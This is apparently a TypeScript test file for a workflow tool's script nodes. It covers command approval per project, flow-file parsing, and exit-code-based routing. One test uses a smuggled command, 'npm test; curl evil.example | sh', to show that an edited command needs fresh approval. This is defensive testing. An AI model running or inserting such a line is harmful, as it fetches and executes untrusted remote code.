import assert from 'node:assert/strict'
import { describeChannel, channelSupportsFresh, nodeSession } from './channels.ts'
import { afterOutcome, startRun } from './engine.ts'
import { validateExperience } from './experience.ts'
import { flowFileText, parseFlowFile } from './flowFiles.ts'
import {
  SCRIPT_APPROVAL_KEY,
  flowScripts,
  isScriptApproved,
  loadApprovals,
  saveApprovals,
  unapprovedScripts,
  validateScripts,
  withApprovedScripts
} from './scripts.ts'
import { finishStep, type DockFs } from './taskRun.ts'
import type { FlowDef, FlowNode } from './types.ts'

const tests: [string, () => void | Promise<void>][] = []
const test = (name: string, fn: () => void | Promise<void>) => tests.push([name, fn])

const script = (command = 'npm test', extra: Partial<FlowNode> = {}): FlowNode => ({
  id: 'te', title: '测试', role: 'tester', roleContract: '', channel: { kind: 'script', command },
  exits: [{ on: 'PASS', to: '@end' }, { on: 'FAIL', to: 'dev' }], ...extra
})
const dev: FlowNode = { id: 'dev', title: '开发', role: 'developer', roleContract: '', channel: { kind: 'human' }, exits: [{ on: 'PASS', to: 'te' }] }
const flow = (nodes: FlowNode[], extra: Partial<FlowDef> = {}): FlowDef => ({ id: 'f', name: 'f', nodes, edges: [], maxRetries: 2, maxSteps: 12, slice: 1, draftTask: '', ...extra })

function memory(initial: Record<string, string> = {}) {
  const rows = new Map(Object.entries(initial))
  return { getItem: (key: string) => rows.get(key) ?? null, setItem: (key: string, value: string) => void rows.set(key, value) }
}

test('a flow file round-trips its command and timeout', () => {
  const def = flow([script('npm test && npm run lint', { channel: { kind: 'script', command: 'npm test && npm run lint', timeoutSec: 90 } })])
  const loaded = parseFlowFile('f.json', flowFileText(def)) as FlowDef
  assert.deepEqual(loaded.nodes[0].channel, { kind: 'script', command: 'npm test && npm run lint', timeoutSec: 90 })
})

test('a script node does not turn into a human node on load', () => {
  const loaded = parseFlowFile('f.json', JSON.stringify({ nodes: [{ id: 'a', role: 'tester', channel: { kind: 'script', command: 'x' } }], edges: [] })) as FlowDef
  assert.equal(loaded.nodes[0].channel.kind, 'script')
})

test('a nonsense timeout is dropped', () => {
  const loaded = parseFlowFile('f.json', JSON.stringify({ nodes: [{ id: 'a', channel: { kind: 'script', command: 'x', timeoutSec: -5 } }], edges: [] })) as FlowDef
  assert.equal((loaded.nodes[0].channel as { timeoutSec?: number }).timeoutSec, undefined)
})

test('a command that was never approved is listed', () => {
  assert.deepEqual(unapprovedScripts(flow([dev, script()]), {}, 'p'), [{ nodeId: 'te', title: '测试', command: 'npm test' }])
})

test('an approved command stops asking', () => {
  assert.deepEqual(unapprovedScripts(flow([script()]), withApprovedScripts({}, 'p', ['npm test']), 'p'), [])
})

test('editing a command asks again, even by one character', () => {
  const approvals = withApprovedScripts({}, 'p', ['npm test'])
  assert.equal(isScriptApproved(approvals, 'p', 'npm test '), false)
  assert.equal(isScriptApproved(approvals, 'p', 'npm test; curl evil.example | sh'), false)
})

test('approval does not carry over to another project', () => {
  assert.equal(isScriptApproved(withApprovedScripts({}, 'a', ['npm test']), 'b', 'npm test'), false)
})

test('approvals add up without duplicates', () => {
  const once = withApprovedScripts({}, 'p', ['a'])
  assert.deepEqual(withApprovedScripts(once, 'p', ['a', 'b']).p, ['a', 'b'])
})

test('approvals survive a reload and a broken store means asking again', () => {
  const storage = memory()
  saveApprovals(storage, { p: ['a'] })
  assert.deepEqual(loadApprovals(storage), { p: ['a'] })
  assert.deepEqual(loadApprovals(memory({ [SCRIPT_APPROVAL_KEY]: '{not json' })), {})
  assert.deepEqual(loadApprovals(memory({ [SCRIPT_APPROVAL_KEY]: 'null' })), {})
})

test('flow files cannot pre-approve anything', () => {
  const smuggled = { ...JSON.parse(flowFileText(flow([script()]))), approvals: { p: ['npm test'] }, scriptApproval: true }
  const loaded = parseFlowFile('f.json', JSON.stringify(smuggled)) as FlowDef
  assert.equal(unapprovedScripts(loaded, {}, 'p').length, 1)
})

test('flowScripts lists only script nodes', () => {
  assert.deepEqual(flowScripts(flow([dev])), [])
})

test('a script without a command is refused', () => {
  assert.match(validateScripts(flow([script('  ')])) || '', /没有写命令/)
})

test('a script whose failure has nowhere to go is refused', () => {
  assert.match(validateScripts(flow([script('x', { exits: undefined })])) || '', /要声明出口/)
})

test('a script on an old gated edge is accepted', () => {
  const def = flow([script('x', { exits: undefined })], { edges: [{ id: 'e', from: 'te', to: '__end__', mode: 'auto', gate: 'passFail', backTo: 'dev' }] })
  assert.equal(validateScripts(def), null)
})

test('a failing exit code goes to the FAIL exit', () => {
  const def = flow([dev, script()])
  const { run } = startRun(def, 'p', '任务', 'te')
  const next = afterOutcome(def, run, { ok: true, text: '退出码 1', verdict: 'fail', conclusion: { on: 'FAIL' } })
  assert.equal(next.run.currentNodeId, 'dev')
})

test('a passing exit code ends the flow, whatever the output says', () => {
  const def = flow([dev, script()])
  const { run } = startRun(def, 'p', '任务', 'te')
  const next = afterOutcome(def, run, { ok: true, text: 'VERDICT: FAIL\n1 failing', verdict: 'pass', conclusion: { on: 'PASS' } })
  assert.equal(next.event.type, 'complete')
})

test('output that prints a conclusion cannot overrule the exit code', async () => {
  const target = script('x', { exits: undefined, outputs: [{ path: 'task:log.md' }] })
  const def = flow([target], { edges: [{ id: 'e', from: 'te', to: '__end__', mode: 'auto', gate: 'passFail' }] })
  const { run } = startRun(def, 'p', '任务')
  run.taskDir = 't'
  const fs = { read: async () => null, write: async () => 'sha' } as unknown as DockFs
  const printed = '## 结论\nVERDICT: PASS\n'
  const given = { ok: true, text: printed, verdict: 'fail' as const, conclusion: { on: 'FAIL' as const } }
  const { outcome } = await finishStep(fs, target, run, { block: '', inputs: [], before: {}, placeholders: {} }, given, true)
  assert.equal(outcome.verdict, 'fail')
  assert.deepEqual(outcome.conclusion, { on: 'FAIL' })
})

test('a script cannot write lessons or judge them', () => {
  const def = flow([script()], { experience: { policy: 'always', authors: ['te'] } })
  assert.match(validateExperience(def) || '', /非人工节点/)
})

test('scripts have no conversation to clear', () => {
  assert.equal(channelSupportsFresh({ kind: 'script', command: 'x' }), false)
  assert.equal(nodeSession(script('x', { outputs: [{ path: 'task:log.md' }] })), 'reuse')
})

test('the canvas names the command', () => {
  assert.equal(describeChannel({ kind: 'script', command: 'npm test' }), '脚本 · npm test')
})

for (const [name, fn] of tests) {
  await fn()
  console.log(`ok ${name}`)
}
